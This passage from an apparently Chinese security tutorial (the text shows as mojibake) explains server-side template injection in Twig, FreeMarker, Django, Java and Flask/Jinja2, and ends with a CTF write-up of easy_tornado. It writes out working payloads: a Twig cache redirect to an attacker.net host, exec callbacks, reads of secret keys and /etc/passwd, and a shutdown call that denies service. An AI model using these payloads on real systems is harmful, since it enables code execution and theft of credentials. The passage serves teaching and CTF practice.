<p>Twig æä¾›äº†ä¸€ä¸ª <code>_self</code>, è™½ç„¶ <code>_self</code> æœ¬èº«æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–¹æ³•ï¼Œä½†æœ‰ä¸€ä¸ª env,envæ˜¯æŒ‡å±æ€§Twig_Environmentå¯¹è±¡ï¼ŒTwig_Environmentå¯¹è±¡æœ‰ä¸€ä¸ª  setCacheæ–¹æ³•å¯ç”¨äºæ›´æ”¹Twigå°è¯•åŠ è½½å’Œæ‰§è¡Œç¼–è¯‘æ¨¡æ¿ï¼ˆPHPæ–‡ä»¶ï¼‰çš„ä½ç½®,Twig  çš„æºç ä¸­çš„ environment.php:</p>
<p><img src="/2021/04/05/wei/5.png" srcset="/img/loading.gif" alt="5"></p>
<p>é€šè¿‡å°†ç¼“å­˜ä½ç½®è®¾ç½®ä¸ºè¿œç¨‹æœåŠ¡å™¨æ¥å¼•å…¥è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´,payload:</p>
<pre><code class="hljs clojure">&#123; &#123;_self.env.setCache(<span class="hljs-string">&quot;ftp://attacker.net:2121&quot;</span>)&#125; &#125;
&#123; &#123;_self.env.loadTemplate(<span class="hljs-string">&quot;backdoor&quot;</span>)&#125; &#125;</code></pre>
<p>ä½†å› allow_url_include ä¸€èˆ¬æ˜¯ä¸æ‰“å¼€çš„ï¼Œæ²¡æ³•åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œæ•…éœ€åˆ©ç”¨è°ƒç”¨è¿‡æ»¤å™¨çš„å‡½æ•° <a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
<p>è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†ä¸€ä¸ª call_user_function æ–¹æ³•</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params">$name</span>)</span>
<span class="hljs-function"></span>&#123;
        [snip]
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filterCallbacks <span class="hljs-keyword">as</span> $callback) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> !== $filter = call_user_func($callback, $name)) &#123;<span class="hljs-comment">//æ³¨æ„è¿™è¡Œ</span>
            <span class="hljs-keyword">return</span> $filter;
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerUndefinedFilterCallback</span>(<span class="hljs-params">$callable</span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;filterCallbacks[] = $callable;
&#125;</code></pre>
<p>æŠŠexec() ä½œä¸ºå›è°ƒå‡½æ•°ä¼ è¿›å»å³å¯ï¼Œpayloadï¼š</p>
<pre><code class="hljs clojure">&#123; &#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125; &#125;
&#123; &#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125; &#125;</code></pre>
<h5 id="freeMarker"><a class="header-anchor" href="#freeMarker">ğŸ­</a>freeMarker</h5>
<p>payload:</p>
<pre><code class="hljs vim">&lt;#assign <span class="hljs-keyword">ex</span>=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; <span class="hljs-keyword">ex</span>(<span class="hljs-string">&quot;id&quot;</span>) &#125;</code></pre>
<h4 id="åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4>
<h5 id="Django"><a class="header-anchor" href="#Django">ğŸ­</a>Django</h5>
<p>æ€è·¯:Djangoæ˜¯ä¸€ä¸ªåºå¤§çš„æ¡†æ¶ï¼Œå…¶æ•°æ®åº“å…³ç³»é”™ç»¼å¤æ‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å±æ€§ä¹‹é—´çš„å…³ç³»å»ä¸€ç‚¹ç‚¹æŒ–æ˜æ•æ„Ÿä¿¡æ¯ã€‚ä½†Djangoä»…ä»…æ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œåœ¨æ²¡æœ‰ç›®æ ‡æºç çš„æƒ…å†µä¸‹å¾ˆéš¾å»æŒ–æ˜ä¿¡æ¯ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å»æŒ–æ˜Djangoè‡ªå¸¦çš„åº”ç”¨ä¸­çš„ä¸€äº›è·¯å¾„ï¼Œæœ€ç»ˆè¯»å–åˆ°Djangoçš„é…ç½®é¡¹</p>
<p>Djangoè‡ªå¸¦çš„åº”ç”¨â€œadminâ€ï¼ˆåå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š</p>
<p><img src="/2021/04/05/wei/6.png" srcset="/img/loading.gif" alt="6"></p>
<p>æ€è·¯ï¼šé€šè¿‡æŸç§æ–¹å¼æ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚</p>
<p>payload:</p>
<pre><code class="hljs roboconf">http://localhost:8000/?email=&#123;<span class="hljs-attribute">user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span>
<span class="hljs-attribute"></span>
<span class="hljs-attribute">http</span>://localhost:8000/?email=&#123;user<span class="hljs-variable">.user_permissions</span><span class="hljs-variable">.model</span><span class="hljs-variable">._meta</span><span class="hljs-variable">.app_config</span><span class="hljs-variable">.module</span><span class="hljs-variable">.admin</span><span class="hljs-variable">.settings</span><span class="hljs-variable">.SECRET_KEY</span>&#125;</code></pre>
<h4 id="åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4>
<h5 id="python"><a class="header-anchor" href="#python">ğŸ­</a>python</h5>
<p><strong>os.system()</strong></p>
<blockquote>
<p>ç”¨æ³•ï¼šos.system(command)</p>
<blockquote>
<p>è¿™ä¸ªè°ƒç”¨ç›¸å½“ç›´æ¥ï¼Œä¸”æ˜¯åŒæ­¥è¿›è¡Œçš„ï¼Œç¨‹åºéœ€è¦<strong>é˜»å¡</strong>å¹¶ç­‰å¾…è¿”å›ã€‚è¿”å›å€¼æ˜¯ä¾èµ–äºç³»ç»Ÿçš„ï¼Œç›´æ¥è¿”å›ç³»ç»Ÿçš„è°ƒç”¨è¿”å›å€¼ã€‚<br>
æ³¨æ„ï¼šè¯¥å‡½æ•°è¿”å›å‘½ä»¤<strong>æ‰§è¡Œç»“æœçš„è¿”å›å€¼</strong>ï¼Œå¹¶ä¸æ˜¯è¿”å›å‘½ä»¤çš„æ‰§è¡Œè¾“å‡ºï¼ˆæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼‰<br>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/lwgkzl/article/details/81060016">å…³äºlinuxä¸‹os.system()è¿”å›å€¼è¯´æ˜</a></p>
</blockquote>
</blockquote>
<p><strong>os.popen()</strong></p>
<blockquote>
<p>ç”¨æ³•ï¼šos.popen(command[,mode[,bufsize]])</p>
<blockquote>
<p>è¯´æ˜ï¼š<strong>mode</strong> â€“ æ¨¡å¼æƒé™å¯ä»¥æ˜¯ â€˜râ€™(é»˜è®¤) æˆ– â€˜wâ€™ã€‚<br>
popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚ç”¨read()å¯ä»¥æŠŠç»“æœå›æ˜¾ã€‚</p>
</blockquote>
</blockquote>
<p><strong>subprocess</strong></p>
<blockquote>
<p>subprocess æ¨¡å—æœ‰æ¯”è¾ƒå¤šçš„åŠŸèƒ½ï¼Œsubprocessæ¨¡å—è¢«æ¨èç”¨æ¥æ›¿æ¢ä¸€äº›è€çš„æ¨¡å—å’Œå‡½æ•°ï¼Œå¦‚ï¼šos.systemã€os.spawnã€os.popenç­‰<br>
subprocessæ¨¡å—ç›®çš„æ˜¯<strong>å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹å¹¶ä¸ä¹‹é€šä¿¡</strong>ã€‚è¿™é‡Œåªè®²ç”¨æ¥è¿è¡Œshellå‘½ä»¤çš„ä¸¤ä¸ªå¸¸ç”¨æ–¹æ³•ã€‚</p>
<blockquote>
<p><strong>subprocess.call(â€œcommandâ€)</strong><br>
çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹å®Œæˆ<br>
è¿”å›é€€å‡ºä¿¡æ¯(returncodeï¼Œç›¸å½“äºLinux exit code)<br>
ä¸os.systemåŠŸèƒ½ç›¸ä¼¼,ä¹Ÿæ— æ‰§è¡Œç»“æœçš„å›æ˜¾</p>
<p><strong>subprocess.Popen(â€œcommandâ€)</strong><br>
è¯´æ˜ï¼š<code>class subprocess.Popen(args, bufsize=0, executable=None,  stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False,  shell=False, cwd=None, env=None, universal_newlines=False,  startupinfo=None, creationflags=0)</code><br>
Popenéå¸¸å¼ºå¤§ï¼Œæ”¯æŒå¤šç§å‚æ•°å’Œæ¨¡å¼ï¼Œé€šè¿‡å…¶æ„é€ å‡½æ•°å¯ä»¥çœ‹åˆ°æ”¯æŒå¾ˆå¤šå‚æ•°ã€‚ä½†Popenå‡½æ•°å­˜åœ¨ç¼ºé™·åœ¨äºï¼Œ<strong>å®ƒæ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•</strong>ï¼Œå¦‚æœè¿è¡Œcmdå‘½ä»¤æ—¶äº§ç”Ÿå†…å®¹éå¸¸å¤šï¼Œå‡½æ•°å°±å®¹æ˜“é˜»å¡ã€‚å¦ä¸€ç‚¹ï¼Œ<strong>Popenæ–¹æ³•ä¹Ÿä¸ä¼šæ‰“å°å‡ºcmdçš„æ‰§è¡Œä¿¡æ¯</strong>ã€‚</p>
</blockquote>
</blockquote>
<h5 id="JAVA"><a class="header-anchor" href="#JAVA">ğŸ­</a>JAVA</h5>
<p>java.langåŒ…æ˜¯javaè¯­è¨€çš„æ ¸å¿ƒï¼Œå®ƒæä¾›äº†javaä¸­çš„åŸºç¡€ç±»ã€‚åŒ…æ‹¬åŸºæœ¬Objectç±»ã€Classç±»ã€Stringç±»ã€åŸºæœ¬ç±»å‹çš„åŒ…è£…ç±»ã€åŸºæœ¬çš„æ•°å­¦ç±»ç­‰ç­‰æœ€åŸºæœ¬çš„ç±»ã€‚</p>
<p>payloadï¼š</p>
<pre><code class="hljs jboss-cli">$&#123;T<span class="hljs-params">(java.lang.System)</span><span class="hljs-string">.getenv</span><span class="hljs-params">()</span>&#125;

$&#123;T<span class="hljs-params">(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(&#x27;cat etc/passwd&#x27;)</span>&#125;
æ–‡ä»¶æ“ä½œï¼š
$&#123;T<span class="hljs-params">(org.apache.commons.io.IOUtils)</span><span class="hljs-string">.toString</span><span class="hljs-params">(T(java.lang.Runtime)</span><span class="hljs-string">.getRuntime</span><span class="hljs-params">()</span><span class="hljs-string">.exec</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span><span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(32)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(101)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(116)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(99)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(47)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(112)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(97)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(115)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(119)</span>)<span class="hljs-string">.concat</span><span class="hljs-params">(T(java.lang.Character)</span><span class="hljs-string">.toString</span><span class="hljs-params">(100)</span>))<span class="hljs-string">.getInputStream</span><span class="hljs-params">()</span>)&#125;</code></pre>
<h3 id="æ”»å‡»æ–¹å‘-äºŒ"><a class="header-anchor" href="#æ”»å‡»æ–¹å‘-äºŒ">ğŸ­</a>æ”»å‡»æ–¹å‘(äºŒ)</h3>
<blockquote>
<p>æŸ¥é…ç½®æ–‡ä»¶</p>
<blockquote>
<p>å¸¸è§é…ç½®æ–‡ä»¶:</p>
<blockquote>
<p>request</p>
<p>æŸ¥çœ‹flaskæ–‡æ¡£å¯çŸ¥:<code>request</code>æ˜¯Flaskæ¨¡ç‰ˆçš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå…¶ä»£è¡¨â€œå½“å‰è¯·æ±‚å¯¹è±¡(flask.request)â€ï¼Œåœ¨è§†å›¾ä¸­è®¿é—®<code>request</code>å¯¹è±¡èƒ½çœ‹åˆ°å¾ˆå¤šæœŸå¾…çš„ä¿¡æ¯ã€‚åœ¨<code>request</code> å¯¹è±¡ä¸­æœ‰ä¸€ä¸ª<code>environ</code>å¯¹è±¡åã€‚<code>request.environ</code>å¯¹è±¡æ˜¯ä¸€ä¸ªä¸æœåŠ¡å™¨ç¯å¢ƒç›¸å…³çš„å¯¹è±¡å­—å…¸ï¼Œå­—å…¸ä¸­ä¸€ä¸ªåä¸º<code>shutdown_server</code>çš„æ–¹æ³•ååˆ†é…çš„é”®ä¸º<code>werkzeug.server.shutdown</code>ï¼Œæ³¨å°„<code>&#123; &#123; request.environ['werkzeug.server.shutdown']() &#125; &#125;</code>åœ¨æœåŠ¡ç«¯ä¼šå½¢æˆä¸€ä¸ªå½±å“æä½çš„æ‹’ç»æœåŠ¡ï¼Œä½¿ç”¨gunicornè¿è¡Œåº”ç”¨ç¨‹åºè¿™ä¸ªæ–¹æ³•çš„æ•ˆæœä¾¿æ¶ˆå¤±ã€‚</p>
<p>config</p>
<p><code>config</code>ä¹Ÿæ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€œå½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼Œ<code>SECRET_KEY</code>ç­‰æ•æ„Ÿå€¼ã€‚æŸ¥çœ‹è¿™äº›é…ç½®é¡¹ç›®ï¼Œåªéœ€æ³¨å…¥<code>&#123; &#123; config.items() &#125; &#125;</code>æœ‰æ•ˆè½½è·ã€‚å®ƒçš„å­ç±»åŒ…å«å¤šä¸ªç‹¬ç‰¹çš„æ–¹æ³•ï¼š<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code>, ä»¥åŠ<code>root_path</code></p>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<p>å‘½ä»¤æ‰§è¡Œï¼ˆæ²™ç›’é€ƒé€¸ç±»é¢˜ç›®çš„åˆ©ç”¨æ–¹å¼ï¼‰</p>
</blockquote>
<h4 id="æŸ¥é…ç½®æ–‡ä»¶"><a class="header-anchor" href="#æŸ¥é…ç½®æ–‡ä»¶">ğŸ­</a>æŸ¥é…ç½®æ–‡ä»¶</h4>
<h5 id="Flask-Jinja2"><a class="header-anchor" href="#Flask-Jinja2">ğŸ­</a>Flask/Jinja2</h5>
<p><strong>æ¨¡æ¿</strong></p>
<pre><code class="hljs dust"><span class="hljs-template-variable">&#123; &#123; ... &#125;</span><span class="xml"> &#125;ï¼šè£…è½½ä¸€ä¸ªå˜é‡ï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨ä¼ è¿›æ¥çš„åŒåå‚æ•°è¿™ä¸ªå˜é‡ä»£è¡¨çš„å€¼æ›¿æ¢æ‰ã€‚</span>
<span class="hljs-template-variable">&#123; % ... % &#125;</span><span class="xml">ï¼šè£…è½½ä¸€ä¸ªæ§åˆ¶è¯­å¥ã€‚</span>
<span class="hljs-template-variable">&#123; # ... # &#125;</span><span class="xml">ï¼šè£…è½½ä¸€ä¸ªæ³¨é‡Šï¼Œæ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ä¼šå¿½è§†è¿™ä¸­é—´çš„å€¼</span></code></pre>
<p><strong>å˜é‡</strong></p>
<p>åœ¨æ¨¡æ¿ä¸­æ·»åŠ å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ï¼ˆsetï¼‰è¯­å¥ã€‚</p>
<pre><code class="hljs routeros">&#123; % <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;xx&#x27;</span> % &#125;</code></pre>
<p>withè¯­å¥æ¥åˆ›å»ºä¸€ä¸ªå†…éƒ¨çš„ä½œç”¨åŸŸï¼Œå°†setè¯­å¥æ”¾åœ¨å…¶ä¸­ï¼Œè¿™æ ·åˆ›å»ºçš„å˜é‡åªåœ¨withä»£ç å—ä¸­æ‰æœ‰æ•ˆ</p>
<pre><code class="hljs clojure">&#123; % with gg = <span class="hljs-number">42</span> % &#125;
&#123; &#123; gg &#125; &#125;
&#123; % endwith % &#125;</code></pre>
<p><strong>ifè¯­å¥</strong></p>
<pre><code class="hljs erlang-repl">&#123; <span class="hljs-comment">% if ken.sick % &#125;</span>
Ken is sick.
&#123; <span class="hljs-comment">% elif ken.dead % &#125;</span>
You killed Ken! You bastard!!!
&#123; <span class="hljs-comment">% else % &#125;</span>
Kenny looks okay --- so far
&#123; <span class="hljs-comment">% endif % &#125;</span></code></pre>
<p><strong>forè¯­å¥</strong></p>
<pre><code class="hljs routeros">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-keyword">in</span><span class="hljs-built_in"> users </span>% &#125;
&#123; &#123; user.username|e &#125; &#125;
&#123; % endfor % &#125;</code></pre>
<p>éå†</p>
<pre><code class="hljs xquery">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>my_dict.iteritems()<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span> % &#125;
&amp;<span class="hljs-literal">lt</span>;dt&amp;<span class="hljs-literal">gt</span>;&#123; &#123;<span class="hljs-built_in"> key</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dt&amp;<span class="hljs-literal">gt</span>;
&amp;<span class="hljs-literal">lt</span>;dd&amp;<span class="hljs-literal">gt</span>;&#123; &#123; <span class="hljs-keyword">value</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dd&amp;<span class="hljs-literal">gt</span>;
&#123; % endfor % &#125;</code></pre>
<p>Jinja2ä¸­forå¾ªç¯å†…ç½®å¸¸é‡</p>
<ul>
<li>
<p>loop.index å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»1å¼€å§‹ï¼‰</p>
</li>
<li>
<p>loop.index0 å½“å‰è¿­ä»£çš„ç´¢å¼•ï¼ˆä»0å¼€å§‹ï¼‰</p>
</li>
<li>
<p>loop.first æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True/False</p>
</li>
<li>
<p>loop.last æ˜¯å¦æ˜¯æœ€åä¸€æ¬¡è¿­ä»£ï¼Œè¿”å›True/False</p>
</li>
<li>
<p>loop.length åºåˆ—çš„é•¿åº¦</p>
</li>
</ul>
<p>æ³¨æ„ï¼šä¸å¯ä»¥ä½¿ç”¨continueå’Œbreakè¡¨è¾¾å¼æ¥æ§åˆ¶å¾ªç¯çš„æ‰§è¡Œã€‚</p>
<p><strong>è¿‡æ»¤å™¨</strong></p>
<p>è¿‡æ»¤å™¨æ˜¯é€šè¿‡ï¼ˆ|ï¼‰ç¬¦å·è¿›è¡Œä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š{ { name|length } }ï¼šå°†è¿”å›nameçš„é•¿åº¦</p>
<p>ç±»ä¼¼äºæˆ‘ä»¬å¹³å¸¸çš„çš„å‡½æ•°ï¼Œä»–ä»–è¿™ç§åº”è¯¥å°±æ˜¯å†…ç½®å‡½æ•°ï¼Œå› ä¸ºå®ƒæœ¬èº«å°±å«æœ‰å¾ˆå¤šè¿‡æ»¤å™¨</p>
<pre><code class="hljs pgsql">abs(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ã€‚ç¤ºä¾‹ï¼š<span class="hljs-number">-1</span>|abs
last(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ç¤ºä¾‹ï¼šnames|lastã€‚
length(<span class="hljs-keyword">value</span>)ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ã€‚ç¤ºä¾‹ï¼šnames|lengthã€‚
<span class="hljs-keyword">join</span>(<span class="hljs-keyword">value</span>,d=u<span class="hljs-string">&#x27;&#x27;</span>)ï¼šå°†ä¸€ä¸ªåºåˆ—ç”¨dè¿™ä¸ªå‚æ•°çš„å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚
<span class="hljs-type">int</span>(<span class="hljs-keyword">value</span>)ï¼šå°†å€¼è½¬æ¢ä¸º<span class="hljs-type">int</span>ç±»å‹ã€‚
<span class="hljs-type">float</span>(<span class="hljs-keyword">value</span>)ï¼šå°†å€¼è½¬æ¢ä¸º<span class="hljs-type">float</span>ç±»å‹ã€‚
lower(<span class="hljs-keyword">value</span>)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ã€‚
upper(<span class="hljs-keyword">value</span>)ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</code></pre>
<h6 id="2018æŠ¤ç½‘æ¯easy-tornado"><a class="header-anchor" href="#2018æŠ¤ç½‘æ¯easy-tornado">ğŸ­</a>2018æŠ¤ç½‘æ¯easy_tornado</h6>
<p>tornadoæ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶ã€‚é¢˜ç›®æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p>
<blockquote>
<p>flag.txt</p>
<blockquote>
<p><code>flag in /fllllllllllllag</code></p>
</blockquote>
</blockquote>
<blockquote>
<p>welcome.txt</p>
<blockquote>
<p><code>render</code></p>
<p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚<br>
renderå‡½æ•°ä»‹ç»</p>
</blockquote>
</blockquote>
<blockquote>
<p>hints.txt</p>
<p><code>md5(cookie_secret+md5(filename))</code></p>
<p>åˆ†æurlï¼š<code>http://2ee77311-baf5-428b-9c3a-d86c6be03d0e.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=319862cec4f48911760eba1295bf83f5</code></p>
<p>filehash=md5(cookie_secret+md5(filename))<br>
ç°åœ¨filename=/fllllllllllllagï¼Œåªéœ€è¦çŸ¥é“cookie_secretçš„æ—¢èƒ½è®¿é—®flagã€‚</p>
</blockquote>
<p>åœ¨è¯»å–æ–‡ä»¶å¤±è´¥é“¾æ¥ä¸­å‘ç°sstiæ¼æ´ï¼š</p>
<p><img src="/2021/04/05/wei/7.jpg" srcset="/img/loading.gif" alt="7"></p>
<p>æµ‹è¯•å‘ç°ä¸€äº›å­—ç¬¦è¢«è¿‡æ»¤</p>
<pre><code class="hljs 1c"><span class="hljs-string">&quot; % &#x27; () * - /=[\]_|</span></code></pre>
<p>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax">Tornadoå®˜æ–¹æ–‡æ¡£</a></p>
<p>é€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°cookie_secretåœ¨Applicationå¯¹è±¡settingså±æ€§ä¸­ï¼Œè¿˜å‘ç°<code>self.application.settings</code>æœ‰ä¸€ä¸ªåˆ«å<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">requesthandler.settings</a></p>
<p><img src="/2021/04/05/wei/13.png" srcset="/img/loading.gif" alt="13"></p>
<p><em>handleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ï¼ŒRequestHandler.settingsæŒ‡å‘self.application.settingsï¼Œå› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settingsã€‚</em></p>
<p>æ„é€ payload:</p>
<p><img src="/2021/04/05/wei/8.jpg" srcset="/img/loading.gif" alt="8"></p>
<p>è®¡ç®—<code>filehash</code>:</p>
<pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span>

<span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">s</span>):</span>
<span class="hljs-function"> <span class="hljs-variable">md5</span> = <span class="hljs-variable">hashlib.md5</span>() </span>
<span class="hljs-function"> <span class="hljs-variable">md5.update</span>(<span class="hljs-variable">s.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) </span>
<span class="hljs-function"> <span class="hljs-variable">return</span> <span class="hljs-variable">md5.hexdigest</span>()</span>
 
<span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">filehash</span>():</span>
<span class="hljs-function"> <span class="hljs-variable">filename</span> = <span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span></span>
<span class="hljs-function"> <span class="hljs-variable">cookie_secret</span> = <span class="hljs-string">&#x27;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&#x27;</span></span>
<span class="hljs-function"> <span class="hljs-title">print</span>(<span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>)))</span>
 
